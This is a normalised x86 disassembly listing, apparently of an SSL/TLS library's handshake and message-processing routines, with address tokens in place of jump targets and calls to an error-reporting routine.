mov [ esp + 0x10 ] ebx
mov eax [ ebp + 0x64 ]
test eax eax
je r-xdata
push eax
push 0x6e
push ebp
call sub_1001cb50
add esp 0xc
mov esi eax
xor ebx ebx
jmp r-xdata
add ecx eax
mov [ ebp + 0x34 ] 0x1061
mov [ ebp + 0x44 ] ecx
mov al [ esi ]
cmp al 0x5
je r-xdata
push eax
push 0x6e
push ebp
call sub_1001cb50
add esp 0xc
mov [ ebp + 0x44 ] ebx
mov [ ebp + 0x34 ] 0x1080
jmp r-xdata
push 0x1
push ebp
call sub_100199f0
push 0x273
push r--data
push 0xce
push 0x66
push 0x14
call sub_1001de60
add esp 0x1c
or esi 0xffffffff
jmp r-xdata
mov edi [ ebp + 0xbc ]
mov [ esi ] 0x2
mov eax [ ebp + 0x8 ]
lea ebx [ esi + 0x1 ]
mov ecx [ edi + 0xac ]
lea edx [ esi + 0xa ]
push ebx
push ecx
mov [ esp + 0x24 ] edi
mov [ esp + 0x40 ] edx
call [ eax + 0x4c ]
mov edx [ esp + 0x28 ]
add ebx eax
push edx
call sub_1002b5d0
add esp 0xc
cmp eax 0x8
mov [ edi + 0x4 ] eax
jg r-xdata
mov [ ebp + 0x44 ] ebx
mov [ ebp + 0x34 ] 0x1060
jmp r-xdata
push 0x2dd
push r--data
push 0x44
push 0xa7
push 0x14
call sub_1001de60
add esp 0x14
or esi 0xffffffff
jmp r-xdata
lea edi [ eax + 0x1 ]
mov eax ecx
lea esi [ edx + 0x8c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ ebp + 0x54 ]
mov [ ebp + 0x34 ] 0x1041
mov edx [ ecx + 0x88 ]
mov [ ebp + 0x48 ] 0x0
inc edx
xor ebx ebx
mov [ ebp + 0x44 ] edx
push ebx
push ebp
call sub_100199f0
add esp 0x8
or esi 0xffffffff
jmp r-xdata
lea esi [ edi + 0x9 ]
lea ebx [ edi + 0x1 ]
push 0x0
mov [ edi ] 0x1
push esi
mov [ ebx ] 0x0
mov [ ebx + 0x1 ] 0x2
push ebp
add ebx 0x2
call sub_1000de10
add esp 0x4
push eax
push ebp
call sub_1000de70
add esp 0x10
add esi eax
test eax eax
mov [ esp + 0x38 ] esi
je r-xdata
mov eax [ ebp + 0xd8 ]
mov esi 0x1
mov ecx [ eax + 0x3c ]
inc ecx
cmp edi ebx
mov [ eax + 0x3c ] ecx
je r-xdata
mov eax [ ebp + 0xd8 ]
inc [ eax + 0x58 ]
jmp r-xdata
mov eax [ ebp + 0x54 ]
lea esi [ ebx + 0x1 ]
mov ecx [ eax + 0x64 ]
lea edi [ eax + 0x68 ]
xor eax eax
[ esi ] [ edi ]
jne r-xdata
mov ecx [ ebp + 0x68 ]
mov edx [ ebp ]
push ecx
push ebp
push edi
push ebx
push 0x0
push edx
push 0x0
call eax
add esp 0x1c
cmp esi ebx
jle r-xdata
test al al
jne r-xdata
xor ebx ebx
mov [ ebp + 0x44 ] 0x0
mov [ ebp + 0x34 ] 0x1070
xor ebx ebx
jmp r-xdata
push 0x0
push ebp
call sub_100199f0
push 0x284
push r--data
push 0x44
jmp r-xdata
test eax eax
jle r-xdata
push 0x23f
push r--data
push 0xb5
push 0x65
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
mov ecx eax
mov [ ebx + 0x1 ] al
sar ecx 0x8
mov [ ebx ] cl
mov edx [ ebp + 0xbc ]
add ebx 0x2
mov ecx [ edx + 0x44 ]
test ecx ecx
mov [ esp + 0x1c ] ecx
jbe r-xdata
push esi
push 0x20
push ebp
call [ esp + 0x20 ]
add esp 0xc
jmp r-xdata
push 0x0
push ebp
call sub_100199f0
push 0x3ad
push r--data
push 0x88
push 0x6e
jmp r-xdata
jmp r-xdata
push ebx
push ebp
call sub_100199f0
push 0x393
push r--data
push 0xd4
push 0x6e
push 0x14
call sub_1001de60
add esp 0x1c
or esi 0xffffffff
jmp r-xdata
push 0x397
push r--data
push 0xc8
push 0x6e
push 0x14
call sub_1001de60
mov eax [ ebp + 0x44 ]
mov ecx 0x3
sub ecx eax
add eax esi
push ecx
push eax
push ebp
call sub_1001c1c0
push eax
push 0x6e
push ebp
call sub_1001cb50
add esp 0x2c
jmp r-xdata
push 0x66
mov ecx [ esp + 0x20 ]
push ecx
call sub_1002b600
mov esi eax
add esp 0x4
test esi esi
mov [ edi + 0x10 ] esi
jle r-xdata
push eax
lea eax [ edi + 0x8 ]
push eax
call sub_10021970
add esp 0x8
test eax eax
jle r-xdata
or esi 0xffffffff
mov [ ebx ] 0x0
mov [ ebx + 0x1 ] 0x0
add ebx 0x2
cmp ecx 0x20
ja r-xdata
push 0x14
call sub_1001de60
add esp 0x1c
mov esi eax
mov edi [ edi + 0xac ]
test [ edi + 0x14 ] 0x2
je r-xdata
cmp esi 0x30
jg r-xdata
mov edx [ ebp + 0x54 ]
mov eax esi
add edx 0x68
sub esi edi
add esi 0x10
xor ebx ebx
mov ecx [ edx ]
mov [ eax ] ecx
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
mov [ ebp + 0x34 ] 0x1011
mov [ ebp + 0x44 ] esi
mov [ ebp + 0x48 ] 0x0
mov eax ecx
mov [ ebx + 0x1 ] cl
sar eax 0x8
mov [ ebx ] al
mov esi [ ebp + 0xbc ]
mov eax [ esp + 0x38 ]
mov edx ecx
add esi 0x48
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
add ebx 0x2
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x18 ]
mov ecx edx
add eax ecx
mov [ esp + 0x38 ] eax
mov esi eax
jmp r-xdata
test [ edi + 0x10 ] 0x2
je r-xdata
mov eax 0x8
push 0x0
push ebp
call sub_100199f0
push 0x293
push r--data
push 0x44
jmp r-xdata
lea edx [ edi + 0x14 ]
push esi
push edx
call sub_10021900
add esp 0x8
test eax eax
jle r-xdata
mov eax [ ebp + 0x54 ]
push 0x10
mov [ eax + 0x64 ] 0x10
mov [ ebx ] 0x0
mov [ ebx + 0x1 ] 0x10
mov ecx [ ebp + 0x54 ]
add ecx 0x68
push ecx
call sub_10021970
add esp 0x8
test eax eax
jle r-xdata
mov eax esi
mov [ esp + 0x18 ] eax
jmp r-xdata
mov eax 0x5
jmp r-xdata
push 0x0
push ebp
call sub_100199f0
push 0x2a7
push r--data
push 0x8b
mov edx [ esp + 0x1c ]
sub esi eax
mov eax esi
mov edi [ esp + 0x38 ]
mov ecx eax
lea esi [ edx + 0x14 ]
sar ecx 0x8
mov [ ebx ] cl
mov ecx eax
mov edx ecx
mov [ ebx + 0x1 ] al
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
xor edx edx
and ecx 0x3
add ebx 0x2
[ edi ] [ esi ]
mov edi [ esp + 0x1c ]
mov ecx [ esp + 0x38 ]
add ecx eax
lea esi [ eax + edi + 0x14 ]
mov eax [ ebp + 0x54 ]
mov [ esp + 0x38 ] ecx
cmp [ eax + 0xc ] edx
mov eax [ esp + 0x18 ]
setne dl
inc edx
push edx
push ecx
mov ecx [ edi + 0x90 ]
push esi
push eax
push ecx
call sub_10019500
add esp 0x14
test eax eax
jle r-xdata
push 0x0
push ebp
call sub_100199f0
add esp 0x8
jmp r-xdata
cmp esi eax
mov [ esp + 0x18 ] eax
jl r-xdata
push 0x0
push ebp
call sub_100199f0
push 0x2b5
push r--data
push 0xd0
jmp r-xdata
mov ecx [ ebp + 0xf4 ]
mov edx [ esp + 0x38 ]
test ecx 0x8000000
je r-xdata
test [ ebp + 0xf4 ] __dos_header
je r-xdata
inc [ edx + 0x1 ]
mov esi [ esp + 0x1c ]
mov ecx eax
sar ecx 0x8
mov [ ebx ] cl
mov [ ebx + 0x1 ] al
add edx eax
mov eax [ esi + 0x4 ]
mov ecx eax
add ebx 0x2
sar ecx 0x8
cmp eax 0x8
mov [ ebx ] cl
mov [ ebx + 0x1 ] al
jg r-xdata
inc [ esi ]
push 0x0
push ebp
call sub_100199f0
push 0x2c4
push r--data
push 0x44
jmp r-xdata
mov ecx eax
add esi 0x8
mov ebx ecx
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
and ecx 0x3
[ edi ] [ esi ]
mov esi [ esp + 0x2c ]
mov [ ebp + 0x34 ] 0x1031
sub eax esi
mov [ ebp + 0x48 ] 0x0
add eax edx
xor ebx ebx
mov [ ebp + 0x44 ] eax
sub_10018900
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
mov eax [ edi + 0x3c ]
mov ebx [ eax + 0x4 ]
mov eax [ edi + 0x34 ]
cmp eax 0x1020
jne r-xdata
mov eax [ edi + 0x54 ]
mov ecx [ eax + 0xe4 ]
mov edx [ eax + 0xe0 ]
add ecx edx
mov edx [ eax + 0xd8 ]
lea ebp [ ecx + edx + 0xb ]
cmp ebp 0x3fff
jbe r-xdata
mov eax [ edi + 0x44 ]
mov ecx 0xb
sub ecx eax
add eax ebx
push ecx
push eax
push edi
call sub_1001c1c0
mov esi [ edi + 0x44 ]
mov edx 0xb
sub edx esi
add esp 0xc
cmp eax edx
jge r-xdata
mov eax [ edi + 0x44 ]
mov esi ebp
sub esi eax
add eax ebx
push esi
push eax
push edi
call sub_1001c1c0
add esp 0xc
cmp eax esi
je r-xdata
push 0x17e
push r--data
push 0x128
push 0x6d
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
mov [ edi + 0x44 ] 0xb
mov cl [ ebx ]
cmp cl 0x4
lea eax [ ebx + 0x1 ]
je r-xdata
push eax
push 0x6d
push edi
call sub_1001cb50
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ edi + 0x64 ]
test eax eax
je r-xdata
push eax
push 0x6d
push edi
call sub_1001cb50
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
retn
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov cl [ eax - 0x1 ]
test cl cl
je r-xdata
mov eax [ edi + 0x6c ]
lea esi [ ebx + 0xb ]
test eax eax
je r-xdata
mov ecx [ edi + 0x68 ]
mov edx [ edi ]
push ecx
push edi
push ebp
push ebx
push 0x0
push edx
push 0x0
call eax
add esp 0x1c
xor ecx ecx
mov ecx 0x1
jmp r-xdata
push 0x167
push r--data
push 0xc8
push 0x6d
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x0
push edi
call sub_100199f0
push 0x163
push r--data
push 0xd4
push 0x6d
push 0x14
call sub_1001de60
add esp 0x1c
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ edi + 0xbc ]
mov ecx [ eax + 0x44 ]
test ecx ecx
jbe r-xdata
mov eax [ edi + 0x54 ]
mov ecx [ eax + 0xe0 ]
test ecx ecx
je r-xdata
mov edx [ edi + 0x54 ]
xor ecx ecx
mov ch [ eax ]
mov cl [ eax + 0x1 ]
add eax 0x2
mov [ edx + 0xe0 ] ecx
mov edx [ edi + 0x54 ]
xor ecx ecx
mov ch [ eax ]
mov cl [ eax + 0x1 ]
add eax 0x2
mov [ edx + 0xe4 ] ecx
mov edx [ edi + 0x54 ]
xor ecx ecx
mov ch [ eax ]
mov cl [ eax + 0x1 ]
mov [ edx + 0xd8 ] ecx
mov [ edi + 0x34 ] 0x1021
mov [ edi ] ecx
mov [ edi + 0x6c ] ecx
mov ecx [ edi + 0x54 ]
xor edx edx
mov dl [ eax ]
inc eax
mov [ ecx + 0xdc ] edx
mov edx [ edi ]
xor ecx ecx
mov ch [ eax ]
mov cl [ eax + 0x1 ]
add eax 0x2
cmp ecx edx
jge r-xdata
mov eax [ edi + 0x54 ]
push esi
mov ecx [ eax + 0xe0 ]
mov edx [ eax + 0xdc ]
push ecx
push edx
push edi
call sub_10019370
add esp 0x10
test eax eax
jg r-xdata
push 0x0
push edi
call sub_1000f330
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ eax + 0xdc ]
test ecx ecx
je r-xdata
push 0x18e
push r--data
push 0xd8
push 0x6d
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ edi + 0x54 ]
mov edx [ eax + 0xe0 ]
mov eax [ eax + 0xe4 ]
add esi edx
test eax eax
jne r-xdata
push 0x4
push edi
call sub_100199f0
add esp 0x8
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
push eax
push edi
call sub_100199f0
add esp 0x8
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ eax + 0xe4 ]
test ecx ecx
je r-xdata
test [ edi + 0xf4 ] 0x10
jne r-xdata
mov ecx [ edi + 0xbc ]
add ecx 0xb4
push ecx
push eax
push esi
push edi
call sub_1000dee0
mov edx [ edi + 0x54 ]
mov ebp eax
add esp 0x10
add esi [ edx + 0xe4 ]
test ebp ebp
mov [ esp + 0x14 ] esi
jne r-xdata
push 0x1
push edi
call sub_100199f0
push 0x1c2
push r--data
push 0xb8
push 0x6d
push 0x14
call sub_1001de60
add esp 0x1c
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ edi + 0xbc ]
mov ecx [ eax + 0x90 ]
test ecx ecx
je r-xdata
push 0x19c
push r--data
push 0xda
push 0x6d
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x196
push r--data
push 0xd9
push 0x6d
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
push sub_1000dde0
push ebp
call sub_1001e2c0
push edi
call sub_1000de10
mov esi eax
push sub_1000dde0
push esi
call sub_1001e2c0
mov eax [ edi + 0xf4 ]
add esp 0x14
test eax 0x400000
je r-xdata
push eax
push edi
call sub_100199f0
push 0x1d1
push r--data
push 0x41
push 0x6d
push 0x14
call sub_1001de60
add esp 0x1c
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x0
push edi
call sub_100199f0
push 0x210
mov edx [ ecx + 0x8 ]
mov eax [ eax + 0x94 ]
cmp eax [ edx ]
jne r-xdata
mov ebx esi
mov esi ebp
mov ebx ebp
jmp r-xdata
mov eax [ edi + 0x54 ]
mov ecx [ eax + 0xd8 ]
mov [ eax + 0x88 ] ecx
mov eax [ edi + 0x54 ]
cmp [ eax + 0x88 ] 0x10
jbe r-xdata
push ebx
call sub_1001e7b0
add esp 0x4
cmp ebp eax
jl r-xdata
push ebp
push ebx
call sub_1001e7c0
push eax
push esi
call sub_1001e620
add esp 0x10
test eax eax
jge r-xdata
push ebx
xor ebp ebp
call sub_1001e7b0
add esp 0x4
test eax eax
jle r-xdata
mov ecx [ eax + 0xd8 ]
lea edi [ eax + 0x8c ]
mov edx ecx
mov eax 0x1
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
retn
push 0x0
push edi
call sub_100199f0
push 0x218
push r--data
push 0x12b
push 0x6d
push 0x14
call sub_1001de60
add esp 0x1c
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
push ebp
push ebx
call sub_1001e7c0
mov ecx [ edi + 0xbc ]
add esp 0x8
mov [ ecx + 0xac ] eax
mov eax [ edi + 0xbc ]
mov ecx [ eax + 0x94 ]
test ecx ecx
je r-xdata
push 0x1
push edi
call sub_100199f0
push 0x1f9
push r--data
push 0xb9
push 0x6d
push 0x14
call sub_1001de60
add esp 0x1c
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
push ebx
inc ebp
call sub_1001e7b0
add esp 0x4
cmp ebp eax
jl r-xdata
mov edx [ eax + 0x90 ]
push 0x208
push r--data
push 0x3
mov ecx [ edx + 0x8 ]
push 0x1
mov edx [ ecx ]
mov [ eax + 0x94 ] edx
mov eax [ edi + 0xbc ]
mov ecx [ eax + 0x94 ]
add ecx 0x10
push ecx
call sub_1001f5f0
mov esi [ esp + 0x28 ]
add esp 0x14
push 0x0
push edi
call sub_100199f0
push 0x202
jmp r-xdata
push r--data
push 0x44
push 0x6d
push 0x14
call sub_1001de60
add esp 0x1c
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
sub_10018e10
mov eax 0x20
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x30 ]
push edi
mov ebp 0x1090
mov eax [ esi + 0x3c ]
mov edi [ eax + 0x4 ]
mov eax [ esi + 0x34 ]
cmp eax 0x1050
jne r-xdata
mov ebx [ esi + 0x44 ]
mov eax [ esi + 0x34 ]
sub ebx 0x2
cmp eax ebp
jne r-xdata
mov eax [ esi + 0x44 ]
mov ecx 0x22
sub ecx eax
add eax edi
push ecx
push eax
push esi
call sub_1001c1c0
mov ecx [ esi + 0x44 ]
mov edx 0x12
sub edx ecx
add esp 0xc
cmp eax edx
jge r-xdata
mov eax [ esi + 0x34 ]
cmp eax 0x1051
je r-xdata
mov eax [ esi + 0xd8 ]
xor ecx ecx
xor edx edx
mov [ esp + 0x1c ] ecx
mov [ esp + 0x14 ] edx
mov eax [ eax + 0x74 ]
xor ebp ebp
test eax eax
je r-xdata
add eax ecx
mov ecx [ esi + 0x64 ]
test ecx ecx
mov [ esi + 0x44 ] eax
je r-xdata
push eax
push 0x64
push esi
call sub_1001cb50
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
push esi
call sub_1001cc10
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
cmp eax 0x1052
jne r-xdata
cmp ebp 0x1
mov [ esi + 0x18 ] 0x1
jne r-xdata
lea ecx [ esp + 0x14 ]
lea edx [ esp + 0x1c ]
push ecx
push edx
push esi
call eax
mov ebp eax
add esp 0xc
test ebp ebp
jge r-xdata
cmp [ edi + 0x1 ] 0x1
je r-xdata
mov edx [ esi + 0x68 ]
push edx
push esi
push eax
mov eax [ esi ]
push edi
push 0x0
push eax
push 0x0
call ecx
add esp 0x1c
lea ecx [ esp + 0x20 ]
mov [ esp + 0x34 ] edi
push ecx
call sub_1002aa30
mov edx [ esi + 0xd8 ]
push 0x0
lea ecx [ esp + 0x28 ]
mov eax [ edx + 0x88 ]
push eax
push ecx
call sub_1002aa50
mov eax [ esi + 0x54 ]
mov edx [ eax + 0x9c ]
add eax 0xa0
push edx
push eax
lea eax [ esp + 0x38 ]
push eax
call sub_1002ab80
lea eax [ edi + 0x2 ]
push ebx
lea ecx [ esp + 0x40 ]
push eax
push ecx
call sub_1002ab80
mov eax [ esi + 0xbc ]
lea edx [ esp + 0x5c ]
push edx
mov ecx [ eax + 0x90 ]
mov edx [ ecx + 0x8 ]
mov eax [ edx ]
push eax
call sub_10022840
push eax
lea ecx [ esp + 0x54 ]
push edi
push ecx
mov [ esp + 0x4c ] eax
call sub_1002ab80
lea edx [ edi + 0x6 ]
mov [ esp + 0x70 ] edi
mov [ esp + 0x54 ] edx
mov [ edi ] 0x8
mov eax [ esp + 0x70 ]
inc eax
mov [ esp + 0x70 ] eax
mov [ eax ] 0x1
mov ebx [ esp + 0x70 ]
mov ecx [ esi + 0x94 ]
inc ebx
mov [ esp + 0x70 ] ebx
lea eax [ esp + 0x54 ]
mov edx [ ecx ]
push eax
mov eax [ edx ]
push eax
call sub_10022840
mov ecx [ esp + 0x78 ]
mov [ esp + 0x54 ] eax
shr eax 0x8
mov [ ecx ] al
mov edx [ esp + 0x78 ]
mov al [ esp + 0x54 ]
mov ebx 0x2
mov [ edx + 0x1 ] al
mov edx [ esp + 0x78 ]
mov ecx [ esi + 0x94 ]
add edx ebx
mov [ esp + 0x78 ] edx
add esp 0x44
mov edx [ ecx ]
lea ecx [ esp + 0x10 ]
mov eax [ edx + 0x4 ]
mov edx [ esp + 0x18 ]
push eax
push ecx
lea eax [ esp + 0x28 ]
push edx
push eax
call sub_1002e720
lea ecx [ esp + 0x30 ]
push ecx
call sub_1002b000
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x48 ]
shr edx 0x8
mov [ eax ] dl
mov ecx [ esp + 0x48 ]
mov dl [ esp + 0x24 ]
add esp 0x14
mov [ ecx + 0x1 ] dl
mov eax [ esp + 0x18 ]
mov edx [ esp + 0x10 ]
mov ebp [ esp + 0x34 ]
add eax edx
add ebp ebx
mov [ esp + 0x18 ] eax
sub eax edi
mov [ esp + 0x34 ] ebp
mov [ esi + 0x34 ] 0x1053
mov [ esi + 0x44 ] eax
mov [ esi + 0x48 ] 0x0
test ebp ebp
jne r-xdata
test edx edx
je r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x14 ]
mov [ esi + 0x18 ] 0x4
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x20
retn
mov eax [ esi + 0x94 ]
test eax eax
je r-xdata
push 0x6
push esi
call sub_100199f0
push 0x307
push r--data
push 0x66
push 0x64
push 0x14
call sub_1001de60
add esp 0x1c
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x20
retn
mov [ esi + 0x34 ] 0x1051
mov [ esp + 0x34 ] edi
mov [ edi ] 0x0
mov eax [ esp + 0x34 ]
inc eax
mov [ esp + 0x34 ] eax
mov [ eax ] 0x0
mov eax [ esp + 0x34 ]
mov [ eax + 0x1 ] 0x2
mov eax [ esp + 0x34 ]
add eax 0x2
mov [ esi + 0x48 ] 0x0
mov [ esp + 0x34 ] eax
mov [ esi + 0x44 ] 0x3
test ecx ecx
je r-xdata
test ecx ecx
je r-xdata
mov [ esi + 0x34 ] ebp
mov eax [ eax ]
cmp [ eax ] 0x0
je r-xdata
push 0x33f
push r--data
push 0x6a
push 0x64
push 0x14
call sub_1001de60
add esp 0x14
jmp r-xdata
push ecx
call sub_10022870
mov edx [ esp + 0x18 ]
add esp 0x4
test edx edx
je r-xdata
push ecx
push esi
mov [ esi + 0x34 ] 0x1052
call sub_1001bee0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
push edx
call sub_10023940
add esp 0x4
xor ebp ebp
mov eax [ esp + 0x14 ]
push eax
push esi
call sub_1001c030
add esp 0x8
test eax eax
jne r-xdata
mov [ esi + 0x34 ] 0x1052
jmp r-xdata
mov ecx [ esp + 0x1c ]
push ecx
call sub_10022870
mov edx [ esp + 0x18 ]
push edx
call sub_10023940
add esp 0x8
sub_100191a0
push ebx
mov ebx [ esp + 0x8 ]
push esi
push edi
mov eax [ ebx + 0x3c ]
mov esi [ eax + 0x4 ]
mov eax [ ebx + 0x34 ]
cmp eax 0x1070
jne r-xdata
mov eax [ ebx + 0x44 ]
mov edi 0x11
sub edi eax
add eax esi
push edi
push eax
push ebx
call sub_1001c1c0
add esp 0xc
cmp eax edi
jge r-xdata
mov eax [ ebx + 0x44 ]
mov ecx 0x1
sub ecx eax
add eax esi
push ecx
push eax
push ebx
call sub_1001c1c0
mov ecx [ ebx + 0x44 ]
mov edx 0x1
sub edx ecx
add esp 0xc
cmp eax edx
jge r-xdata
mov edi [ ebx + 0x44 ]
add edi eax
mov eax [ ebx + 0x64 ]
test eax eax
mov [ ebx + 0x44 ] edi
mov ecx edi
je r-xdata
push eax
push 0x6c
push ebx
call sub_1001cb50
add esp 0xc
pop edi
pop esi
pop ebx
retn
add ecx eax
mov [ ebx + 0x44 ] ecx
mov al [ esi ]
cmp al 0x7
jne r-xdata
push eax
push 0x6c
push ebx
call sub_1001cb50
add esp 0xc
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x6c ]
test eax eax
jne r-xdata
mov edx [ ebx + 0x68 ]
push edx
push ebx
push ecx
mov ecx [ ebx ]
push esi
push 0x0
push ecx
push 0x0
call eax
add esp 0x1c
cmp al 0x6
je r-xdata
pop edi
mov [ ebx + 0x34 ] 0x1050
pop esi
mov eax 0x1
pop ebx
retn
test [ ebx + 0xf4 ] 0x1
jne r-xdata
mov edx [ ebx + 0xbc ]
inc esi
mov [ edx + 0x44 ] 0x10
mov eax [ ebx + 0xbc ]
mov ecx [ esi ]
add eax 0x48
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ esi + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ esi + 0xc ]
mov [ eax + 0xc ] edx
mov [ ebx + 0x34 ] 0x1071
test al al
je r-xdata
pop edi
mov [ ebx + 0x34 ] 0x3
pop esi
mov eax 0x1
pop ebx
retn
mov eax [ ebx + 0xbc ]
mov ecx [ eax + 0x44 ]
cmp ecx 0x20
ja r-xdata
push 0x3d0
push r--data
push 0xc8
push 0x6c
push 0x14
call sub_1001de60
mov eax [ ebx + 0x44 ]
mov ecx 0x3
sub ecx eax
add eax esi
push ecx
push eax
push ebx
call sub_1001c1c0
push eax
push 0x6e
push ebx
call sub_1001cb50
add esp 0x2c
pop edi
pop esi
pop ebx
retn
push 0x0
push ebx
call sub_100199f0
push 0x3cc
push r--data
push 0xd4
push 0x6c
push 0x14
call sub_1001de60
add esp 0x1c
or eax 0xffffffff
pop edi
pop esi
pop ebx
retn
push 0x0
push ebx
call sub_100199f0
push 0x3f5
push r--data
push 0xe7
push 0x6c
push 0x14
call sub_1001de60
add esp 0x1c
or eax 0xffffffff
pop edi
pop esi
pop ebx
retn
lea edi [ eax + 0x48 ]
inc esi
xor eax eax
[ esi ] [ edi ]
je r-xdata
test eax eax
je r-xdata
sbb eax eax
sbb eax 0xffffffff
sub_10019370
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
lea ecx [ esp + 0x28 ]
xor ebp ebp
push eax
push ecx
push ebp
mov [ esp + 0x20 ] ebp
mov [ esp + 0x1c ] ebp
call sub_10022820
mov esi eax
add esp 0xc
cmp esi ebp
jne r-xdata
call sub_1001e3c0
mov edi eax
cmp edi ebp
mov [ esp + 0x14 ] edi
je r-xdata
push 0x40b
push r--data
push 0xb
jmp r-xdata
push 0x411
push r--data
push 0x41
push esi
push edi
call sub_1001e6c0
add esp 0x8
test eax eax
je r-xdata
push 0x7e
push 0x14
call sub_1001de60
add esp 0x14
mov ebx [ esp + 0x1c ]
push edi
push ebx
call sub_100110d0
mov ecx [ ebx + 0xc4 ]
add esp 0x8
cmp ecx ebp
je r-xdata
call sub_1001df60
mov edx [ ebx + 0xbc ]
mov eax [ ebx + 0xe0 ]
mov [ edx + 0x98 ] eax
call sub_10010fb0
mov edi eax
test edi edi
jne r-xdata
cmp eax ebp
jg r-xdata
mov ecx [ ebx + 0xbc ]
mov eax [ ecx + 0x90 ]
test eax eax
je r-xdata
mov [ esp + 0x10 ] 0xffffffff
jmp r-xdata
push 0x419
push r--data
push 0x86
jmp r-xdata
mov edx [ ebx + 0xbc ]
lea eax [ edi + 0xc ]
push esi
mov [ edx + 0x90 ] edi
mov [ eax ] esi
mov [ edi + 0x8 ] eax
call sub_10021790
mov ebp eax
add esp 0x4
xor esi esi
test ebp ebp
jne r-xdata
push eax
call sub_10011010
add esp 0x4
mov eax [ esp + 0x14 ]
push eax
call sub_1001e780
push esi
call sub_10022870
push ebp
call sub_10023940
mov eax [ esp + 0x1c ]
add esp 0xc
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
cmp [ ebp ] 0x6
je r-xdata
push 0x430
push r--data
push 0xed
jmp r-xdata
push 0x1
push edi
call sub_100110b0
add esp 0x8
test eax eax
je r-xdata
push 0x435
push r--data
push 0xd2
jmp r-xdata
mov [ esp + 0x10 ] 0x1
jmp r-xdata
sub_10019500
mov eax [ esp + 0x4 ]
push esi
push edi
or edi 0xffffffff
test eax eax
je r-xdata
push 0x44c
push r--data
push 0xc0
push 0xbc
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
retn
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
je r-xdata
push eax
call sub_10021790
mov esi eax
add esp 0x4
test esi esi
je r-xdata
cmp [ esi ] 0x6
je r-xdata
mov ecx [ esp + 0x1c ]
mov edx [ esi + 0xc ]
mov eax [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push eax
push ecx
push edx
call sub_10024770
mov edi eax
add esp 0x14
test edi edi
jge r-xdata
push 0x451
push r--data
push 0xd1
jmp r-xdata
push esi
call sub_10023940
add esp 0x4
mov eax edi
pop edi
pop esi
retn
push 0x458
push r--data
push 0x4
push 0xbc
push 0x14
call sub_1001de60
add esp 0x14
sub_100195f0
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
mov eax [ esi + 0x54 ]
pop esi
mov eax [ eax + 0x44 ]
retn
xor eax eax
pop esi
retn
sub_10019610
push esi
push edi
push 0xf6
push r--data
push 0x120
call sub_1001d4c0
mov esi eax
add esp 0xc
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn
mov ecx 0x48
xor eax eax
mov edi esi
push 0xfe
push r--data
push 0x8001
[ edi ]
call sub_1001d4c0
add esp 0xc
mov [ esi + 0x30 ] eax
test eax eax
je r-xdata
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push 0x102
push r--data
push 0x8002
call sub_1001d4c0
add esp 0xc
mov [ esi + 0x34 ] eax
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call sub_1001d740
add esp 0x4
mov edx [ esp + 0xc ]
push ebx
push ebp
mov ecx 0x48
